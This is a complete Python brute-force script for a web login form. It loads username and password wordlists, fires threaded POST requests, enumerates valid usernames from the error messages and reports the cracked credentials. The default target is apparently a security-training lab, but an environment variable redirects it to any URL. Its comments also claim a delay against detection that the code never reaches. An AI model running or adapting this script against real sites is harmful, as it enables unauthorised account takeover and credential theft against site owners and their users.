import requests
import time
from concurrent.futures import ThreadPoolExecutor
import os

"""
This script performs a brute-force attack on a web login form.
It reads usernames and passwords from 'users.txt' and 'pswd.txt' respectively,
and attempts to log in by trying all combinations.
The script uses a ThreadPoolExecutor to make concurrent login attempts, speeding up the process.
"""

# URL del formulario de inicio de sesión (configurable via LOGIN_URL environment variable)
DEFAULT_URL = 'https://0a18005104b93cc6810b70d700d200d4.web-security-academy.net/login'
URL = os.environ.get('LOGIN_URL', DEFAULT_URL)

print(f"[INFO] Targeting URL: {URL}")

# Check for wordlist files and content
if not os.path.exists('users.txt') or os.path.getsize('users.txt') == 0:
    print("[!] Error: 'users.txt' not found or is empty. Please create it and add usernames, one per line.")
    exit()

if not os.path.exists('pswd.txt') or os.path.getsize('pswd.txt') == 0:
    print("[!] Error: 'pswd.txt' not found or is empty. Please create it and add passwords, one per line.")
    exit()

# Cargar listas de usuarios y contraseñas desde archivos
with open('users.txt', 'r') as users_file:
    usernames = users_file.read().splitlines()

with open('pswd.txt', 'r') as pwd_file:
    passwords = pwd_file.read().splitlines()

# Configuración de concurrencia
MAX_THREADS = 5  # Número de hilos en paralelo
# Initialize a session object to persist certain parameters across requests (e.g., cookies)
# This can also improve performance by reusing the underlying TCP connection.
session = requests.Session()

# Función de ataque a una combinación de usuario y contraseña
def brute_force(username):
    """
    Attempts to log in with a given username and all passwords from the list.
    """
    try:
        # Iterate through each password in the loaded list for the given username
        for password in passwords:
            # Prepare the data payload for the POST request
            data = {'username': username, 'password': password}
            # Send the POST request to the login URL
            res = session.post(URL, data=data)

            # Check the server's response for "Invalid username"
            # If found, it means the username does not exist, so we stop trying passwords for this user.
            if "Invalid username" in res.text:
                print(f"[-] Usuario no válido: {username} (saltando a otro usuario)")
                return  # Exit the function for this username, proceed to the next

            # Check the server's response for "Incorrect password"
            # If found, it means the username is valid, but the password was wrong. Continue to the next password.
            if "Incorrect password" in res.text:
                print(f"[-] Incorrecto: {username}:{password}")
                continue  # Continue to the next password in the loop

            # If neither "Invalid username" nor "Incorrect password" is found,
            # it implies the login was successful.
            print(f"\n[🔥] ¡Credenciales encontradas!\nUsername: {username}\nPassword: {password}\n")
            os._exit(0)  # Use os._exit(0) for immediate termination in threads

            # Brief pause to make the script slightly less aggressive.
            # This might help avoid rate limiting or detection by simple firewalls.
            time.sleep(0.5)

    except requests.exceptions.RequestException as e:
        print(f"[!] Error de conexión con {username} - {e}")
        time.sleep(5)  # Espera para evitar bloqueo

# Función para probar todos los usuarios en paralelo
def start_attack():
    """
    Initializes a thread pool and assigns brute-force tasks for each username.
    """
    # Create a ThreadPoolExecutor that will manage a pool of worker threads.
    # max_workers specifies the maximum number of threads that can run concurrently.
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # The map function applies the 'brute_force' function to each item in the 'usernames' list.
        # Each call to 'brute_force(username)' will run in a separate thread from the pool.
        executor.map(brute_force, usernames)

# Iniciar ataque
start_attack()
# Script execution starts here
